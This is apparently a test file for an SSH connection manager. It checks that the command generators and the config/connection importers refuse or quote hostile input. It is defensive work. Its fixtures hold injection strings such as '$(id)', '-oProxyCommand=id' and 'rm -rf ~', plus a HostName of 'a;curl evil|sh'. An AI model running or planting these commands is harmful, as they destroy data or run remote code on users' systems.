import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  generateSSHCommand, generateSCPCommand, generateRsyncCommand, generateTerminalLaunch,
  generateBatchScript, generateKeyGenCommand, generateRDPCommand, parseSSHConfig,
  createDefaultConnection, generateInstallCommand,
} from '../src/utils.ts';
import { sanitizeImportedConnection } from '../src/importer.ts';
import { DEFAULT_SETTINGS } from '../src/types.ts';

const conn = (o = {}) => createDefaultConnection({ name: 'web', host: 'example.org', username: 'ubuntu', keyPath: '~/.ssh/id_ed25519', ...o }, 'linux');
const refused = (s: string) => s.startsWith('# Refused:');

test('plain connection stays readable', () => {
  assert.equal(generateSSHCommand(conn(), 'linux'), 'ssh -i ~/.ssh/id_ed25519 ubuntu@example.org');
});

test('shell metacharacters in host or user are refused', () => {
  for (const host of ['a;touch /tmp/x', 'a b', '$(id)', '`id`', 'a|b', 'a\nb', '-oProxyCommand=id']) {
    assert.ok(refused(generateSSHCommand(conn({ host }), 'linux')), host);
  }
  for (const username of ['-oProxyCommand=id', 'a;b', 'a b', '']) {
    assert.ok(refused(generateSSHCommand(conn({ username }), 'linux')), username);
  }
});

test('option-injection via jump host and forwards is refused', () => {
  assert.ok(refused(generateSSHCommand(conn({ jumpHost: '-oProxyCommand=id' }), 'linux')));
  const pf = [{ id: '1', type: 'local' as const, localPort: 8080, remoteHost: 'x;id', remotePort: 80, enabled: true }];
  assert.ok(refused(generateSSHCommand(conn({ portForwards: pf }), 'linux')));
  const bad = [{ id: '1', type: 'local' as const, localPort: 99999, remoteHost: 'db', remotePort: 80, enabled: true }];
  assert.ok(refused(generateSSHCommand(conn({ portForwards: bad }), 'linux')));
});

test('key paths with spaces/quotes are quoted per platform', () => {
  assert.equal(generateSSHCommand(conn({ keyPath: "/home/a b/it's" }), 'linux'),
    "ssh -i '/home/a b/it'\\''s' ubuntu@example.org");
  const win = conn({ keyPath: 'C:\\Users\\a b\\.ssh\\id' });
  assert.equal(generateSSHCommand(win, 'windows'), 'ssh -i "C:\\Users\\a b\\.ssh\\id" ubuntu@example.org');
  assert.ok(refused(generateSSHCommand(conn({ keyPath: 'C:\\x" & calc & "' }), 'windows')));
  assert.ok(refused(generateSSHCommand(conn({ keyPath: 'C:\\$env:X y' }), 'windows')));
});

test('posix backslash path is quoted, windows backslash path is plain', () => {
  assert.match(generateSSHCommand(conn({ keyPath: '/a\\b' }), 'linux'), /-i '\/a\\b'/);
  assert.match(generateSSHCommand(conn({ keyPath: 'C:\\k\\id' }), 'windows'), /-i C:\\k\\id /);
});

test('leading dash in key path cannot become an option', () => {
  assert.match(generateSSHCommand(conn({ keyPath: '-oProxyCommand=id' }), 'linux'), /-i \.\/-oProxyCommand=id /);
});

test('scp/rsync quote operands and end option parsing', () => {
  const c = conn();
  const up = generateSCPCommand(c, '/tmp/a b; rm -rf ~', '/srv/x', 'upload', 'linux');
  assert.equal(up, "scp -i ~/.ssh/id_ed25519 -- '/tmp/a b; rm -rf ~' ubuntu@example.org:/srv/x");
  const dl = generateSCPCommand(c, '-evil', '/srv/f', 'download', 'linux');
  assert.match(dl, / -- ubuntu@example\.org:\/srv\/f \.\/-evil$/);
  const rs = generateRsyncCommand(c, '/a', '/b/data', 'upload', 'linux');
  assert.match(rs, /^rsync -avz -e 'ssh -p 22 -i ~\/\.ssh\/id_ed25519' -- \/a ubuntu@example\.org:\/b\/data$/);
  for (const remote of ['/b$(id)', '/srv/a b', 'x;touch /tmp/pwn', '-remote']) {
    assert.ok(refused(generateRsyncCommand(c, '/a', remote, 'upload', 'linux')), remote);
    assert.ok(refused(generateSCPCommand(c, '/a', remote, 'upload', 'linux')), remote);
  }
  assert.ok(refused(generateRsyncCommand(conn({ keyPath: '/a b' }), '/a', '/b', 'upload', 'linux')));
});

test('launchers embedding commands only accept plain args and sanitize titles', () => {
  const s = { ...DEFAULT_SETTINGS, platform: 'macos' as const, preferredTerminal: 'terminal-app' as const };
  assert.ok(refused(generateTerminalLaunch(conn({ keyPath: "/a b/k" }), s)));
  const ok = generateTerminalLaunch(conn(), s);
  assert.equal(ok, `osascript -e 'tell application "Terminal" to do script "ssh -i ~/.ssh/id_ed25519 ubuntu@example.org"'`);
  const lin = { ...DEFAULT_SETTINGS, platform: 'linux' as const, preferredTerminal: 'gnome-terminal' as const };
  assert.equal(generateTerminalLaunch(conn({ name: 'x"; rm -rf ~; "' }), lin),
    'gnome-terminal --title="x__ rm -rf __ _" -- ssh -i ~/.ssh/id_ed25519 ubuntu@example.org');
});

test('generated scripts never contain unsanitized names or hosts', () => {
  const evil = conn({ name: 'a"\n& calc', host: 'h;calc' });
  for (const platform of ['windows', 'macos', 'linux'] as const) {
    const script = generateBatchScript([evil], platform);
    assert.ok(!script.includes('calc"'), platform);
    assert.ok(!/h;calc/.test(script.replace(/# Refused: Invalid host/g, '')), platform);
  }
});

test('windows batch generator refuses nested quoted key path without throwing', () => {
  const output = generateBatchScript([conn({ keyPath: 'C:\\Users\\a b\\.ssh\\id' })], 'windows');
  assert.match(output, /REM Refused:/);
  assert.ok(!output.includes('start "web"'));
});

test('keygen comment is quoted and rsa size validated', () => {
  assert.equal(generateKeyGenCommand('ed25519', 0, 'me@x.org', 'linux'), 'ssh-keygen -t ed25519 -C me@x.org -f ~/.ssh/id_ed25519');
  assert.match(generateKeyGenCommand('ed25519', 0, 'a"; rm -rf ~; "', 'linux'), /-C 'a"; rm -rf ~; "'/);
  assert.ok(refused(generateKeyGenCommand('rsa', 1, 'x', 'linux')));
  assert.ok(refused(generateKeyGenCommand('ed25519', 0, 'a"; calc; "', 'windows')));
});

test('rdp and install commands validate inputs', () => {
  assert.ok(refused(generateRDPCommand(conn({ host: 'h /admin' }), 'windows')));
  assert.ok(refused(generateInstallCommand('x; rm -rf ~', { ...DEFAULT_SETTINGS, packageManager: 'apt' })));
  assert.match(generateInstallCommand('lrzsz', { ...DEFAULT_SETTINGS, packageManager: 'apt' }), /apt install -y lrzsz$/);
});

test('ssh config import keeps only literal, valid entries', () => {
  const cfg = [
    'Host *', '  User root',
    'Host good', '  HostName 10.0.0.5', '  User deploy', '  Port 2222', '  IdentityFile ~/.ssh/k',
    'Host evil', '  HostName a;curl evil|sh', '  User -oProxyCommand=id', '  Port abc',
    'Host a b', '  HostName ignored',
    'Host !neg', 'Host=eq', '  HostName=1.2.3.4',
  ].join('\r\n');
  const r = parseSSHConfig(cfg, 'linux');
  const by = Object.fromEntries(r.map(x => [x.name, x]));
  assert.deepEqual(Object.keys(by).sort(), ['eq', 'evil', 'good']);
  assert.equal(by.good.host, '10.0.0.5');
  assert.equal(by.good.port, 2222);
  assert.equal(by.good.keyPath, '~/.ssh/k');
  assert.equal(by.evil.host, 'evil');
  assert.equal(by.evil.username, undefined);
  assert.equal(by.evil.port, undefined);
  assert.equal(by.eq.host, '1.2.3.4');
});

test('import sanitizer drops secrets, unknown keys and invalid hosts', () => {
  const ok = sanitizeImportedConnection({ name: 'n', host: 'h.example', username: 'u', password: 'pw', githubToken: 't', vncPassword: 'v', evil: 1, __proto__: { x: 1 } }, 'linux');
  assert.ok(ok.connection);
  assert.equal(ok.connection!.password, '');
  assert.equal(ok.connection!.githubToken, '');
  assert.equal(ok.connection!.vncPassword, '');
  assert.equal((ok.connection as unknown as Record<string, unknown>).evil, undefined);
  assert.equal(sanitizeImportedConnection({ host: 'a;b', username: 'u' }, 'linux').connection, null);
  assert.equal(sanitizeImportedConnection({ host: 'h', username: '-o', port: 22 }, 'linux').connection, null);
  assert.equal(sanitizeImportedConnection({ host: 'h', username: 'u', port: 70000 }, 'linux').connection, null);
  assert.equal(sanitizeImportedConnection('x', 'linux').connection, null);
  assert.equal(sanitizeImportedConnection({ host: 'h', username: 'u', portForwards: [null, { type: 'local', localPort: 1, remoteHost: 'x;y', remotePort: 2, enabled: true }] }, 'linux').connection, null);
  const odd = sanitizeImportedConnection({
    host: 'host', username: 'admin', tags: { some: 'not a function' },
    githubRepos: [3, 'owner/repo'], startupCommands: ['rm -rf /'],
    envVars: { TOKEN: 'sensitive' }, customTerminalCmd: 'echo unsafe',
    portForwards: [{ type: 'dynamic', localPort: 1080, id: 'd', enabled: true, extra: 'junk' }],
  }, 'linux').connection;
  assert.ok(odd);
  assert.deepEqual(odd!.tags, []);
  assert.deepEqual(odd!.githubRepos, ['owner/repo']);
  assert.deepEqual(odd!.startupCommands, []);
  assert.deepEqual(odd!.envVars, {});
  assert.equal(odd!.customTerminalCmd, '');
  assert.equal((odd!.portForwards[0] as unknown as Record<string, unknown>).extra, undefined);
  assert.equal(sanitizeImportedConnection({ host: 'h', username: 'u', protocol: 'malicious' }, 'linux').connection, null);
});
